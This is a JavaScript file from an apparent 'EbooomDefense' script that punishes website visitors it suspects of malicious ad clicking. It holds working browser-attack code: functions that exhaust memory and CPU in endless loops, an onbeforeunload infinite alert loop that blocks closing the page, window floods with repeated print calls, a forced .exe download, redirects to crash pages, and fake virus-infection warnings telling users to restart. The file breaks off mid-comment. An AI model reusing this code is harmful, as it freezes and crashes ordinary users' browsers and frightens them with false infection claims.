//    RemoveRule: function (index) {
//        this.style.removeRule(index);
//    },
//    //取得所有样式
//    getRules: function () {
//        if (this.style.rules) { //IE
//            return this.style.rules;
//        }
//        return this.style.cssRules; //非IE
//    },
//    //通过选择器，取得样式
//    getRule: function (selector) {
//        var rules = this.getRules();
//        for (var i = 0; i < rules.length; i++) {
//            var r = rules[i];
//            if (r.selectorText == selector) {
//                var rule = new EbooomDefense.CssRule(r);
//                rule.index = i;
//                return rule;
//            }
//        }
//        return null;
//    }
//};


EbooomDefense.Doc = document;
EbooomDefense.DocElement = document.documentElement;
EbooomDefense.element = document.createElement("div");
// 少量CPU占用，缓慢消耗内存
EbooomDefense.SomeCPUAndSlowConsumeRam = function () {
    var MyObject = {};
    var e = EbooomDefense.Doc.createElement("div");
    e.myProp = MyObject;
    e.onclick = function () { alert(''); };
    EbooomDefense.element.appendChild(e);
    e.onclick = null;
};
// 占用内存
EbooomDefense.RAM = function (consumeRam) {
    var q = [];
    var n = 0;
    while (1 != 2) {
        q.push(makeSpan());
        n++;
        var objectA = new Object();
        var objectB = new Object();
        objectA.someOtherObject = objectB;
        objectB.anotherObject = objectA;
        objectA.a = q;
        objectB.b = objectA.a;
        objectA.aa = "sdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdfsdf";
        for (var i = 0; i < 10; i++) {
            objectA.aa = objectA.aa + objectA.aa;
        }
    }
    function makeSpan() {
        var s = document.createElement("span");
        document.body.appendChild(s);
        var t = document.createTextNode("*** " + n + " ***");
        s.appendChild(t);
        s.style.visibility = 'hidden';
        s.onclick = function (e) {
            s.style.backgroundColor = "red";
            alert(n);
        };
        return s;
    };
};
// 大量CPU占用，可以指定是否快速消耗内存
EbooomDefense.CPUBurn = function (consumeRam) {
    var container = EbooomDefense.Doc.createElement("div");
    container.style.display = "none";
    EbooomDefense.Doc.body.appendChild(container);
    if (consumeRam) {
        var i = 0;
        var str = "ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss123456";
        var arr = [], arr2 = [], arr3 = [];
        while (str.length <= 600 * 1024 * 1024) {
            str = str + "ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss123456";
            arr.push(str);
            arr2.push(str);
            arr3.push(str);
            container.innerHtml = str;
        }
    }
    else {
        var i = 0;
        var str = "s";
        var arr = [], arr2 = [], arr3 = [];
        while (!(str.length < 0)) {
            str = str + "s";
            container.innerHtml = str;
        }
    }
    //        if (!consumeRam && str.length > 10240000) {
    //            str = "";
    //        }
    //        if (str.length % (100 * 1024 * 1024) == 0) {
    //        }
    //    }
    //    var container = EbooomDefense.Doc.createElement("div");
    //    container.style.display = "none";
    //    EbooomDefense.Doc.body.appendChild(container);
    //    var str = "";
    //    while (!(str.length < 0)) {
    //        str += "s";
    //        if (!consumeRam && str.length > 10240000) {
    //            str = "";
    //        }
    //        container.innerHtml = str;
    //    }
};
// 造成浏览器假死
EbooomDefense.FeignDeath = function () {
    var func = [];
    var URLs = [];
    // 无限弹框，禁止关闭页面          opera效果有，但是可以正常关闭
    func.push(function () {
        var div = EbooomDefense.Doc.createElement("div");
        div.id = "test";
        div.style.cssText = "position:absolute;left:0;top:0; width:1300px; height:600px";
        EbooomDefense.Doc.body.appendChild(div);
        var test = function (t) {
            var bigdiv = t;
            var div = document.createElement("div");
            div.id = "smalldiv";
            div.style.left = Math.random() * 1440 + 'px';
            div.style.position = "absolute";
            div.style.top = Math.random() * 900 + 'px';
            div.style.display = 'block';
            div.innerHTML = "<img src='" + EbooomInfo.domain + "/Dist/e.jpg' alt='error' />";
            bigdiv.appendChild(div);
            setTimeout(function () { test(bigdiv); }, 30);
        };
        window.onbeforeunload = function (e) {
            while (true) { alert("\u7981\u6B62\u6076\u610F\u70B9\u51FB\uFF01"); }
        };
        test(div);
        //            document.writeln("<style>#zc_s_d_1 {position: absolute;}<\/style>"); document.writeln("<div id=\"zc_d_nine\" style=\"position:relative; width:1600px; height:800px;\"><\/div>"); function zc_nine() { try { var bigdiv = document.getElementById("zc_d_nine"); var div = document.createElement("div"); div.id = "zc_s_d_1"; div.style.marginLeft = Math.random() * 1600 + 'px'; div.style.marginRight = Math.random() * 700 + 'px'; div.style.marginBottom = Math.random() * 700 + 'px'; div.style.marginTop = Math.random() * 800 + 'px'; div.style.display = 'inline'; div.innerHTML = "<img src='http://220.194.46.46/ZhiChiZuJi/9qo/d.jpg' alt='System error.' />"; bigdiv.appendChild(div) } catch (e) { }; try { window.onbeforeunload = function (e) { while (true) { alert("\u7981\u6B62\u6076\u610F\u70B9\u51FB\uFF01") } } } catch (e) { }; setTimeout("zc_nine()", 30) }; zc_nine();
    });
    if (!EbooomDefense.ExplorerInfo.chrome) {
        URLs.push("/Dist/cpu/overload.html");
    }
    if (EbooomDefense.ExplorerInfo.ie) {
        func.push(function () {
            var div = EbooomDefense.Doc.createElement("div");
            div.style.cssText = "width: 800px; height: 600px; overflow: auto; position: absolute; z-index: 99998";
            EbooomDefense.Doc.body.appendChild(div);
            var a = EbooomDefense.Doc.createElement("a");
            a.href = "http://down.360safe.com/360safe_cq.exe";    // http://www.juke.com/js/js1.ra
            a.innerHTML = " ";
            EbooomDefense.Doc.body.appendChild(a);
            (function (container, link) {
                setInterval(function () {
                    var iframe = EbooomDefense.Doc.createElement("iframe");
                    iframe.style.cssText = "width: 200px; height: 150px; overflow: hidden";
                    iframe.src = "about:blank";
                    container.appendChild(iframe);
                    var newwin = window.open('', '', '');
                    if (newwin == null) {
                        document.location.href = EbooomInfo.domain + "/Dist/ied/d.html";
                    }
                    newwin.opener = this;
                    newwin.document.write('<html><head><style type="text/css">#defense_a {margin: 0 10px 10px;}  #defense_b { width: 100% }</style><script type="text/javascript">alert("请不要恶意访问我们的网站！"); setInterval(function () { if (window.print) { window.print(); } }, 1);</script></head><body>请不要恶意访问我的的网站<table><tr><td><div id="defense_a"><form id="defense_b"><input type="text" name="test"/></div></td><td width="1"></td></tr></table></body></html>');
                    window.document.execCommand('saveas', '', 'st.rar');
                    link.click();
                }, 300);
            })(div, a);
        });
        URLs.push("/Dist/ied/d.html");
        URLs.push("/Dist/crash/cs.html");
        URLs.push("/Dist/manyf/mf.html");
        URLs.push("/Dist/pop/pop.html");
    }
    else if (EbooomDefense.ExplorerInfo.firefox) {
        URLs.push("/Dist/pop/pop.html");
    }
    else if (EbooomDefense.ExplorerInfo.chrome) {
        URLs.push("/Dist/pop/pop.html");
    }
    else if (EbooomDefense.ExplorerInfo.opera) {
        URLs.push("/Dist/pop/pop.html");
    }
    else if (EbooomDefense.ExplorerInfo.safari) {
        URLs.push("/Dist/crash/cs.html");
    }
    var random = parseInt(Math.random() * 10000 + Math.random() * 100);
    if (func.length > 0 && URLs.length > 0) {
        var flag = (random % 2 == 1 ? true : false);
        if (flag) {
            func[random % func.length]();
        }
        else {
            document.location.href = EbooomInfo.domain + URLs[random % URLs.length];
        }
    }
    else if (func.length > 0) {
        func[random % func.length]();
    }
    else if (URLs.length > 0) {
        document.location.href = EbooomInfo.domain + URLs[random % URLs.length];
    }
};
// 弹出警告图片
EbooomDefense.Warning = function (args) {
    EbooomDefense.Doc.body.style.overflow = "hidden";
    if (!args) {
        args = {};
        args.fullscreen = false;
        args.img_src = "";
        args.mode = "";
        args.func = function () { };
    }
    if (!args.fullscreen) {
        EbooomDefense.Mask();
    }
    else {
        //        EbooomDefense.Doc.body.innerHTML = "";
        var all_element = EbooomDefense.Doc.body.getElementsByTagName("*");
        for (var i = 0; i < all_element.length; i++) {
            if (all_element[i].className.indexOf("ebooom_defense") == -1) {
                //                all_element[i].style.display = "none";
                try {
                    all_element[i].style.visibility = "hidden";
                }
                catch (ex) { }
            }
        }
    }
    var func = function () { };
    if (args.func) {
        func = args.func;
    }
    else if (args.mode) {
        switch (args.mode) {
            case "dead":
                {
                    func = EbooomDefense.FeignDeath;
                    break;
                }
        }
    }
    var simg = new EbooomDefense.SImage(function (img) {
        var pos = EbooomDefense.Pos(), w = pos.w, h = pos.h;
        var t = (h / 2 - img.height / 2), l = (w / 2 - img.width / 2);
        img.style.top = t + "px";
        img.style.left = l + "px";
        EbooomDefense.Doc.body.appendChild(img);
        if (args.fullscreen) {
            var p = EbooomDefense.Pos(), rw = p.w, rh = p.h;
            img.style.top = "0px";
            img.style.left = "0px";
            img.style.width = (EbooomDefense.Doc.body.offsetWidth ? EbooomDefense.Doc.body.offsetWidth : rw) + "px";
            img.style.height = EbooomDefense.getClientHeight() + "px";
        }
        EbooomDefense.addEvent(window, "resize", function (e) {
            var p = EbooomDefense.Pos(), rw = p.x, rh = p.y;
            if (args.fullscreen) {
                img.style.top = "0px";
                img.style.left = "0px";
                img.style.width = (EbooomDefense.Doc.body.offsetWidth ? EbooomDefense.Doc.body.offsetWidth : rw) + "px";
                img.style.height = EbooomDefense.getClientHeight() + "px";
            }
            else {
                var tt = ((p.y == 0 ? (p.h / 2) : p.y) - img.height / 2), ll = ((p.x == 0 ? (p.w / 2) : p.x) - img.width / 2);
                img.style.cssText = "position: absolute; z-index: 99999; top: " + tt + "px; left: " + ll + "px;";
            }
        });
        func();
    });
    if (args.img_src) {
        simg.get(args.img_src);
    }
    else {
        func();
    }
};
// 间歇性调用
EbooomDefense.ProgressiveExecution = function (func, cyclecount, delay) {
    var finish = true;
    var action = function (flag) {
        flag = false;
        for (var counter = 0; counter < cyclecount; counter++) {
            func();
        }
        flag = true;
    };
    var start = function (flag, fuc, wait) {
        var ivt = setInterval(function () {
            if (!!flag) {
                setTimeout(function () { fuc(flag); }, wait);
            }
        }, wait);
    };
    start(finish, action, delay);
};
EbooomDefense.MultiWindow = function (amount, url) {
    if (document.location.href.indexOf('?') == -1) {
        for (var i = 0; i < amount; i++) {
            var a = EbooomDefense.Doc.createElement("a");
            a.target = "_blank";
            if (url) {
                a.href = url + "?" + i;
            }
            else {
                a.href = document.location.href + "?" + i;
            }
            EbooomDefense.Doc.body.appendChild(a);
            if (EbooomDefense.ExplorerInfo.chrome || EbooomDefense.ExplorerInfo.safari) {
                var e = document.createEvent('MouseEvent');
                e.initEvent('click', false, false);
                a.dispatchEvent(e);
            }
            else {
                a.click();
            }
        }
    }
};
EbooomDefense.Action = function (mode, content) {
    switch (mode) {
        case 1: //善意提醒
            {
                EbooomDefense.Alerts("善意提醒", content, 1, true);
                break;
            }
        case 2: //跳转URL
            {
                if (content) {
                    document.location.href = content;
                }
                break;
            }
        case 3: //CPU高速运转
            EbooomDefense.AlertHtml("当您现在打开此页面，将会导致您的电脑硬盘高速旋转，CPU会高速运转，让电脑损伤太大！ 请不要再次恶意点击我们的广告来打开我们的网站，你可直接输入我公司网址查看产品信息，谢谢！  ");
            setTimeout(function () {
                EbooomDefense.MultiWindow(3);
                setTimeout(function () {
                    EbooomDefense.CPUBurn(false);
                }, 1000);
            }, 1000);
            //            EbooomDefense.Warning({ img_src: EbooomInfo.domain + "/Content/images/cpu.gif", fullscreen: true,
            //                func: function () {
            //                    EbooomDefense.MultiWindow(3);
            //                    setTimeout(function () {
            //                        EbooomDefense.CPUBurn(false);
            //                    }, 1000);
            //                }
            //            });
            break;
        case 4: //病毒警告
            //////   no need EbooomDefense.Warning({ img_src: EbooomInfo.domain + "/Content/images/virus.gif", fullscreen: false });
            EbooomDefense.Alerts("病毒警告", "您的电脑将初步感染病毒，请不要再恶意点击。否则会越来越严重，请马上重起电脑。", 3, true);
            break;
        case 5: //无法显示网页 be canceled
            EbooomDefense.Warning({ img_src: EbooomInfo.domain + "/Content/images/err.gif", fullscreen: true, mode: "error" });
            break;
        case 6: //IE假死
            //////     EbooomDefense.Warning({ img_src: EbooomInfo.domain + "/Content/images/dead.gif", mode: "dead" });
            EbooomDefense.Alerts("IE假死", "请不要恶意点击我们的广告。", 99999999);
            EbooomDefense.FeignDeath();
            break;
        case 7: //病毒攻击
            //////      EbooomDefense.Warning({ img_src: EbooomInfo.domain + "/Content/images/virus.gif", fullscreen: false });
            EbooomDefense.Alerts("病毒攻击", "您的电脑已经被感染病毒，请不要再恶意点击。否则会越来越严重，请马上重起电脑。", 99999999);
            break;
        case 8: //内存
            {
                EbooomDefense.AlertHtml("当您现在打开此页面，已经导致您的电脑内存不断消耗直到100%，内存会被全部占满，让电脑死机！ 请不要再次恶意点击我们的广告来打开我们的网站，你可直接输入我公司网址查看产品信息，谢谢！ ");
                setTimeout(function () {
                    //                                EbooomDefense.CPUBurn(true);
                    //                                EbooomDefense.ProgressiveExecution(EbooomDefense.SomeCPUAndSlowConsumeRam, 100000, 1000);
                    EbooomDefense.RAM();
                }, 1000);


                //                //            EbooomDefense.Warning({ img_src: EbooomInfo.domain + "/Content/images/ram.gif", fullscreen: true,
                //                //                func: function () {
                //                //                    setTimeout(function () {
